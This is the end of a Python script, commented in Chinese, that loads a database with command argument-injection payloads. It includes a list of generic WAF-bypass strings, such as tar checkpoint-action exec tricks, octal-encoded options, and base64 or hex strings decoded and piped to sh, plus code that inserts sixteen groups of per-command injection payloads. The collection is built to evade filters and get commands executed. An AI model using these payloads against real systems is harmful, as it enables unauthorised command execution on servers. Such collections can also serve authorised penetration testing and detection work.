# 不针对特定命令，而是通用的参数注入绕过技巧
# ============================================================================
GENERIC_PARAM_BYPASS_PAYLOADS = [
    # ---- 参数分隔与空白绕过 ----
    (
        "参数注入 · 通用 · IFS空白替换",
        "command-injection",
        "通用参数绕过",
        "命令参数",
        "通用",
        "中等",
        "--checkpoint=1${IFS}--checkpoint-action=exec=id",
    ),
    (
        "参数注入 · 通用 · 制表符参数分隔",
        "command-injection",
        "通用参数绕过",
        "命令参数",
        "通用",
        "中等",
        "--option\tvalue",
    ),
    (
        "参数注入 · 通用 · 等号空格互换",
        "command-injection",
        "通用参数绕过",
        "命令参数",
        "通用",
        "中等",
        "--option value",
    ),
    # ---- 参数名混淆 ----
    (
        "参数注入 · 通用 · 双短横线长参数名",
        "command-injection",
        "通用参数绕过",
        "命令参数",
        "通用",
        "中等",
        "--exec=echo EXEC_OK",
    ),
    (
        "参数注入 · 通用 · 参数名大小写混用",
        "command-injection",
        "通用参数绕过",
        "命令参数",
        "通用",
        "中等",
        "-ExEc echo CASEMIX_PARAM_OK",
    ),
    (
        "参数注入 · 通用 · 通配符参数名",
        "command-injection",
        "通用参数绕过",
        "命令参数",
        "通用",
        "高级",
        "$(echo '-e'xec) echo WILD_PARAM_OK \\;",
    ),
    # ---- 参数值混淆 ----
    (
        "参数注入 · 通用 · 引号类型切换",
        "command-injection",
        "通用参数绕过",
        "命令参数",
        "通用",
        "中等",
        "--option=$'value'",
    ),
    (
        "参数注入 · 通用 · 双引号+变量嵌套",
        "command-injection",
        "通用参数绕过",
        "命令参数",
        "通用",
        "高级",
        "--option=\"$(echo NEST_VAR_OK)\"",
    ),
    (
        "参数注入 · 通用 · 反斜杠转义空格",
        "command-injection",
        "通用参数绕过",
        "命令参数",
        "通用",
        "高级",
        "--option\\ value",
    ),
    # ---- 编码绕过 ----
    (
        "参数注入 · 通用 · 八进制参数编码",
        "command-injection",
        "通用参数绕过",
        "命令参数",
        "通用",
        "高级",
        "$'\\55\\55\\157\\160\\164\\151\\157\\156' $'\\166\\141\\154\\165\\145'",
    ),
    (
        "参数注入 · 通用 · base64整体编码",
        "command-injection",
        "通用参数绕过",
        "命令参数",
        "通用",
        "高级",
        "$(echo IC0tb3B0aW9uIHZhbHVl|base64 -d|sh)",
    ),
    (
        "参数注入 · 通用 · xxd十六进制编码",
        "command-injection",
        "通用参数绕过",
        "命令参数",
        "通用",
        "高级",
        "$(echo 2d2d6f7074696f6e2076616c7565|xxd -r -p|sh)",
    ),
]


def main() -> None:
    conn = connect()
    seen_names = existing_keys(conn)
    seen_contents = existing_contents(conn)
    before = conn.execute(
        "SELECT COUNT(*) AS c FROM payloads WHERE is_pool_snapshot = 0 AND is_deleted = 0"
    ).fetchone()["c"]
    print(f"Payloads before: {before}")

    groups = [
        ("awk 参数注入", AWK_PARAM_PAYLOADS),
        ("scp 参数注入", SCP_PARAM_PAYLOADS),
        ("sed 参数注入", SED_PARAM_PAYLOADS),
        ("find 参数注入", FIND_PARAM_PAYLOADS),
        ("grep 参数注入", GREP_PARAM_PAYLOADS),
        ("tar 参数注入", TAR_PARAM_PAYLOADS),
        ("zip / unzip 参数注入", ZIP_PARAM_PAYLOADS),
        ("ssh 参数注入", SSH_PARAM_PAYLOADS),
        ("git 参数注入", GIT_PARAM_PAYLOADS),
        ("rsync 参数注入", RSYNC_PARAM_PAYLOADS),
        ("解释器参数注入 (perl/python/ruby/php/lua)", INTERP_PARAM_PAYLOADS),
        ("make 参数注入", MAKE_PARAM_PAYLOADS),
        ("curl / wget 参数注入", CURL_WGET_PARAM_PAYLOADS),
        ("screen / tmux / script 终端工具", TERMINAL_PARAM_PAYLOADS),
        ("其他命令参数注入 (dd/printf/xargs/strace 等)", OTHER_CMD_PARAM_PAYLOADS),
        ("通用参数注入 WAF 绕过技术", GENERIC_PARAM_BYPASS_PAYLOADS),
    ]
    total = 0
    for title, items in groups:
        print("\n" + "=" * 60)
        print(title)
        print("=" * 60)
        for item in items:
            if insert_payload(conn, seen_names, seen_contents, *item):
                total += 1

    conn.commit()

    after = conn.execute(
        "SELECT COUNT(*) AS c FROM payloads WHERE is_pool_snapshot = 0 AND is_deleted = 0"
    ).fetchone()["c"]
    print("\n" + "=" * 60)
    print(f"Inserted: {total}")
    print(f"Payloads before: {before}")
    print(f"Payloads after: {after}")
    print("=" * 60)

    # Summary by category
    stats = conn.execute(
        """
        SELECT category, COUNT(*) as cnt
        FROM payloads
        WHERE is_pool_snapshot = 0 AND is_deleted = 0
          AND category LIKE '%参数%'
        GROUP BY category
        ORDER BY category
        """
    ).fetchall()
    print("\nParameter injection categories:")
    for row in stats:
        print(f"  {row['category']:25s} | {row['cnt']:3d} payloads")

    conn.close()
    print("\nDone!")


if __name__ == "__main__":
    main()
